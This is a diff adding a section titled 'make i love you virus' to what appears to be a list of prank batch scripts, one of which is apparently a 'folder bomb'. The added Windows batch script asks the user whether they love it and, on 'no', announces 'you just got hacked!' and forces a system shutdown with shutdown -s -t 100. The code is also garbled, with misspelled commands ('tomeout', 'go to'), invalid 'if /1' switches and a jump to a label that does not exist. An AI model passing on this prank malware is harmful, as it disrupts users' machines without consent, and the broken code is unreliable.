@@ -50,6 +50,35 @@ folder bomb.bat
 
 
 
+===============================
+4. make i love you virus
+-------------------------
+@echo off
+
+color a
+echo Hello, do you love me? (answer in yes & no  )
+set /p input=
+if /1 %input%==yes go to love
+if /1 %input%==no goto hate
+if /1 not %input%== yes,no goto 1
+
+:love 
+echo I love you Too...
+echo see you later
+pause
+exit
+
+:hate 
+echo But I love you ... lol
+echo you just got hacked!
+tomeout 3
+shutdown -s -t 100
+----------------------------------
+
+
+
+
+
 
 
 
